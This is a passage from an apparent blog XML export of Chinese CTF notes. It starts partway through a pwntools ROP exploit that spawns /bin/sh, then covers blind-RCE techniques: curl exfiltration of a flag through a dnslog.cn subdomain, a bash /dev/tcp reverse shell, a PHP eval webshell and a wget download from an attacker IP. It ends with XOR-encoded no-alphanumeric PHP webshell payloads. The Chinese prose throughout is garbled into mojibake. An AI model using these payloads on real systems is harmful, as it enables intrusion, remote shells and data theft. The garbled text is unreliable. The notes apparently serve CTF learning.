class="line">log_addr(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rax = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x11f497</span></span><br><span class="line">jmp_rax = <span class="number">0x4011cc</span></span><br><span class="line"></span><br><span class="line">payload = p64(call_read)</span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142302.png" alt="image-20240428184257703"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li><p>å‡ ä¸ª<code>gdb</code>è°ƒè¯•è¦ç”¨åˆ°çš„å‘½ä»¤ï¼š</p>
<p>æŸ¥è¯¢çº¿ç¨‹<code>id</code>ï¼š<code>i threads</code></p>
<p>åˆ‡æ¢çº¿ç¨‹ï¼š<code>thread id</code></p>
<p>çº¿ç¨‹é”å®šï¼š<code>set scheduler-locking on</code></p>
<p>è§£é™¤é”å®šï¼š<code>set scheduler-locking off</code></p>
</li>
<li><p>æ²™ç®±ï¼ˆ<em>Sandbox</em>ï¼‰æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé™åˆ¶ç¨‹åºçš„è¿è¡Œç¯å¢ƒã€‚å¦‚æœçˆ¶è¿›ç¨‹åœ¨åˆ›å»ºå­çº¿ç¨‹ä¹‹å‰è®¾ç½®äº†æ²™ç®±ç­–ç•¥ï¼Œé‚£ä¹ˆè¿™äº›ç­–ç•¥å¯èƒ½ä¼šé™åˆ¶å­çº¿ç¨‹çš„è¡Œä¸ºã€‚ç„¶è€Œï¼Œå¦‚æœå­çº¿ç¨‹åœ¨æ²™ç®±ç­–ç•¥è®¾ç½®ä¹‹å‰å°±å·²ç»åˆ›å»ºï¼Œé‚£ä¹ˆå®ƒå¯èƒ½ä¸ä¼šå—åˆ°è¿™äº›é™åˆ¶ã€‚</p>
</li>
<li><blockquote>
<p>å­è¿›ç¨‹çš„æ ˆåŒºæ˜¯çˆ¶è¿›ç¨‹ç”¨<em>mmap</em>æ˜ å°„å‡ºæ¥çš„ä¸€ç‰‡å†…å­˜(å¹¶ä¸èƒ½åœ¨çˆ¶è¿›ç¨‹é‡Œæº¢å‡ºç¯¡æ”¹å­è¿›ç¨‹çš„æ•°æ®)</p>
<p><em>bss</em>æ®µ <em>data</em>æ®µä»¥åŠä»£ç æ®µ(ä»¥åŠ<em>got</em>è¡¨)çš„æ•°æ®æ˜¯çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´æ‰€å…±äº«çš„</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ²™ç®±</tag>
      </tags>
  </entry>
  <entry>
    <title>æ— å›æ˜¾RCE</title>
    <url>/2025/03/03/%E6%97%A0%E5%9B%9E%E6%98%BERCE/</url>
    <content><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯æ— å›æ˜¾RCEï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ— å›æ˜¾RCEï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ— å›æ˜¾RCEï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ— å›æ˜¾RCEï¼Ÿ</h2><p>æ— å›æ˜¾RCEï¼Œç®€å•æ¥è¯´å°±æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œä¸ç®¡å‘½ä»¤æˆ–ä»£ç æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ ·çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æœ‰exec()ã€shell_exec()ã€‚</p>
<h2 id="åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸ"><a href="#åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸ"></a>åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸ</h2><ol>
<li><p>å»¶æ—¶ï¼š</p>
<span id="more"></span>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">windows</span>ï¼šwhoami&amp;&amp;ping -n <span class="number">5</span> <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Linux</span>ï¼šwhoami&amp;&amp;sleep <span class="number">5</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ç›®æ ‡æœåŠ¡å™¨å‘ä¸ªäººçš„å…¬ç½‘æœåŠ¡å™¨<strong>å‘èµ·httpè¯·æ±‚</strong>ï¼Œå½“è¯¥å…¬ç½‘æœåŠ¡å™¨æ”¶åˆ°httpè¯·æ±‚å°±ä»£è¡¨å‘½ä»¤æœ‰æ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">6666</span></span><br><span class="line"><span class="attribute">curl</span> å…¬ç½‘æœåŠ¡å™¨IP:ç«¯å£å·</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="æ”»å‡»æ–¹æ³•"><a href="#æ”»å‡»æ–¹æ³•" class="headerlink" title="æ”»å‡»æ–¹æ³•"></a>æ”»å‡»æ–¹æ³•</h2><h3 id="teeå‘½ä»¤"><a href="#teeå‘½ä»¤" class="headerlink" title="teeå‘½ä»¤"></a>teeå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> | <span class="built_in">tee</span> a <span class="comment">#å°†lsçš„ç»“æœè¾“å…¥æ–‡ä»¶aä¸­</span></span><br></pre></td></tr></table></figure>

<h3 id="dnslog-cnå¤–å¸¦"><a href="#dnslog-cnå¤–å¸¦" class="headerlink" title="dnslog.cnå¤–å¸¦"></a><a href="http://www.dnslog.cn/">dnslog.cn</a>å¤–å¸¦</h3><ol>
<li>é€‚ç”¨Linux</li>
<li>å‘½ä»¤ç”¨åå¼•å·åŒ…è£¹</li>
<li>å‘½ä»¤ä¸­ä¸èƒ½æœ‰ç©ºæ ¼</li>
</ol>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl `<span class="built_in">whoami</span>`.lc52y4.dnslog.cn</span><br><span class="line">curl `<span class="built_in">cat</span> flag|sed s/[[:space:]]//`.lc52y4.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">6666</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/æœåŠ¡å™¨IP/<span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="ç›´æ¥å†™å…¥æˆ–å¤–éƒ¨ä¸‹è½½webshell"><a href="#ç›´æ¥å†™å…¥æˆ–å¤–éƒ¨ä¸‹è½½webshell" class="headerlink" title="ç›´æ¥å†™å…¥æˆ–å¤–éƒ¨ä¸‹è½½webshell"></a>ç›´æ¥å†™å…¥æˆ–å¤–éƒ¨ä¸‹è½½webshell</h3><ol>
<li><p>ç›´æ¥å†™å…¥ï¼Œéœ€è¦ç«™ç‚¹ç›®å½•å…·æœ‰å†™æƒé™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span> &gt; exp.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¤–éƒ¨ä¸‹è½½ï¼Œç›®æ ‡æœåŠ¡å™¨å¯ä»¥è¿æ¥å¤–ç½‘ä¸”ä¸æ”»å‡»æœºäº’é€šï¼š</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget æ”»å‡»æœºIP -o <span class="built_in">exp</span>.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="å„ç§å‘½ä»¤æ‰§è¡Œ"><a href="#å„ç§å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å„ç§å‘½ä»¤æ‰§è¡Œ"></a>å„ç§å‘½ä»¤æ‰§è¡Œ</h3><p><strong>å‰æï¼šç›®æ ‡æœåŠ¡å™¨ä¸Šè¦æœ‰å·²çŸ¥å¯è¯»æ–‡ä»¶ï¼Œç«™ç‚¹ç›®å½•å…·æœ‰å†™æƒé™</strong></p>
<p>é€šè¿‡æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥å°†phpæ–‡ä»¶å†™å…¥åˆ°åœ¨æµè§ˆå™¨å¯ç›´æ¥è¯»å–çš„æ–‡ä»¶ç±»å‹ä¸­(å¦‚txtæ–‡ä»¶)ï¼Œç„¶åè®¿é—®txtæ–‡ä»¶å³å¯å¾—åˆ°phpæ–‡ä»¶å†…å®¹ã€‚</p>
<ol>
<li><p>cpå’Œmvå’Œé‡å®šå‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> flag.php &gt;&gt; 1.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>tarå’Œzip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php  <span class="comment"># æ‰“åŒ…flag.phpä¸ºflag.tar</span></span><br><span class="line">tar zcvf flag.tar.gz flag.php  <span class="comment"># å‹ç¼©flag.phpä¸ºflag.tar.gz</span></span><br><span class="line"><span class="comment"># è§£å‹ç¼©ï¼štar zxvf flag.tar.gz</span></span><br><span class="line">zip flag.zip flag.php</span><br><span class="line"><span class="comment">#è§£å‹ç¼©ï¼šunzip flag.zip</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/kinyoobi/p/15415869.html">æ— å›æ˜¾çš„æ¸—é€æŠ€å·§ - kinyoobi - åšå®¢å›­</a></p>
<p><a href="https://www.cnblogs.com/pursue-security/p/15406672.html">RCEç¯‡ä¹‹æ— å›æ˜¾rce - å­¦å®‰å…¨çš„å°ç™½ - åšå®¢å›­</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>æ— æ•°å­—å­—æ¯RCE</title>
    <url>/2025/02/06/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
    <content><![CDATA[<p>æ— æ•°å­—å­—æ¯RCEå°±æ˜¯ä¸åˆ©ç”¨æ•°å­—å’Œå­—æ¯ï¼Œæ„é€ <code>webshell</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¸¸è§çš„åˆ©ç”¨æ–¹æ³•æœ‰å¼‚æˆ–ã€å–åè¿™ä¸¤ç§ï¼Œæ­¤å¤–è¿˜æœ‰æˆ–ã€è‡ªå¢å’Œä¸´æ—¶æ–‡ä»¶ã€‚</p>
<h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><h3 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><span id="more"></span>

<p>â€‹	åœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦åˆ†åˆ«è½¬æ¢æˆasciiç å€¼ï¼Œå†å°†è¿™ä¸ªå€¼è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åå°†ä¸¤ä¸ªäºŒè¿›åˆ¶å€¼è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ã€‚æŒ‰ä½å¼‚æˆ–çš„è§„åˆ™ï¼š<code>1^1=0,0^0=0,1^0=1</code></p>
<p>ä»¥<code>@</code>å’Œ<code>!</code>å¼‚æˆ–å¾—<code>a</code>ä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯ä¸‰ç§ä¸åŒçš„æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"><span class="comment">// echo urlencode(&#x27;@!&#x27;);  #%40%21ï¼Œ%åé¢çš„æ˜¯åå…­è¿›åˆ¶</span></span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;)^hexdec(&quot;21&quot;);   #å¾—åˆ°97ï¼Œaçš„asciiç åè¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">97</span>);</span><br><span class="line"><span class="comment">// echo hexdec(&quot;40&quot;).&#x27;,&#x27;.hexdec(&quot;21&quot;);   #64,33æ˜¯40,21çš„åè¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="number">64</span>^<span class="number">33</span>);</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ„é€ <code>$_GET[]</code>ä¼ å…¥æ–°çš„å‚æ•°ï¼Œæ‰§è¡Œ<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$index</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$a</span>=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">27</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">27</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">			<span class="variable">$x</span> = <span class="variable">$a</span>[<span class="variable">$i</span>] ^ <span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">			<span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$string</span>[<span class="variable">$k</span>]) == <span class="variable">$x</span>)&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$k</span>].<span class="string">&quot;:&quot;</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) . <span class="string">&#x27;^%&#x27;</span> . <span class="title function_ invoke__">dechex</span>(<span class="variable">$a</span>[<span class="variable">$j</span>]).<span class="string">&quot;   &quot;</span>;</span><br><span class="line">					<span class="variable">$index</span>++;</span><br><span class="line">					<span class="keyword">if</span>(<span class="variable">$index</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;     <span class="comment">#dechexå°†åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</span></span><br><span class="line">&#125;         <span class="comment">#hexdecå°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</span></span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h3><p>åŸç†ï¼šæŒ‰ä½å¼‚æˆ–ç›¸åŒä¸º0ä¸åŒä¸º1ï¼Œä»»æ„å­—ç¬¦ä¸<code>%ff</code>å¼‚æˆ–ä¸¤æ¬¡å¾—ä»»æ„å­—ç¬¦ã€‚</p>
<p>å…ˆçœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;print_r&#x27;</span> ^ <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%ff%ff%ff%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line"><span class="comment">//$a ä¸º %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">#è¾“å‡º:print_r</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>print_r(scandir(.));</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//%8F%8D%96%91%8B%A0%8D^%ff%ff%ff%ff%ff%ff%ff  #print_r</span></span><br><span class="line"><span class="comment">//%8C%9C%9E%91%9B%96%8D^%ff%ff%ff%ff%ff%ff%ff(%D1^%ff)  #scandir(.)</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(.));</span><br><span class="line"><span class="comment">//((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>readfile(end(scandir(.)));</code>ï¼š</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">((<span class="variable">%8</span>D<span class="variable">%9</span>A<span class="variable">%9</span>E<span class="variable">%9</span>B<span class="variable">%99</span><span class="variable">%96</span><span class="variable">%93</span><span class="variable">%9</span>A)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(((<span class="variable">%9</span>A<span class="variable">%91</span><span class="variable">%9</span>B)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))((<span class="variable">%8</span>C<span class="variable">%9</span>C<span class="variable">%9</span>E<span class="variable">%91</span><span class="variable">%9</span>B<span class="variable">%96</span><span class="variable">%8</span>D)^(<span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span><span class="variable">%ff</span>))(<span class="variable">%D1</span>^<span class="variable">%ff</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶å€™å¯èƒ½ä¼šé™åˆ¶å­—ç¬¦çš„ç§ç±»ä¸ªæ•°ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨åŸæœ‰çš„å­—ç¬¦é‡Œå†ç›¸äº’å¼‚æˆ–å‡ºéœ€è¦çš„å­—ç¬¦ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªæ‰¾å“ªäº›å­—ç¬¦å¯ä»¥ç”±å“ªäº›å­—ç¬¦å¼‚æˆ–å¾—å‡ºã€‚</p>
<p>ä¾‹å¦‚<code>a = c^p^r</code>ï¼Œä¸ºä»€ä¹ˆè¦ä¸‰ä¸ªå­—ç¬¦å¼‚æˆ–ä¸¤æ¬¡è€Œä¸æ˜¯ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–ä¸€æ¬¡å‘¢ï¼Œå› ä¸ºè¦ä¿è¯å…¶ä»–çš„å­—ç¬¦ä¸å˜ï¼Œéœ€è¦ä¸<code>%ff</code>å¼‚æˆ–ä¸¤æ¬¡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Find</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]^<span class="variable">$a</span>[<span class="variable">$k</span>])==<span class="variable">$c</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$k</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$c</span>.<span class="string">&#x27;   &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;eadilnscipt&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">Find</span>(<span class="variable">$str</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨è¦å°†<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))</code>å‡å°‘å­—ç¬¦ç§ç±»ï¼Œå…¶å®æˆ‘ä»¬æ˜¯è¦<strong>å¯¹<code>%8F%8D%96%91%8B%A0%8D</code>è¿›è¡Œå¤šæ¬¡å¼‚æˆ–ä½¿ä¹‹ä¸å˜</strong>ï¼Œå·²çŸ¥<code>n = i^s^t</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;n&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;i&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;s&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;t&#x27;</span>^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%ff&quot;</span>));</span><br><span class="line"><span class="comment">#è¾“å‡º:%91 %96 %8C %8B</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%96&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span 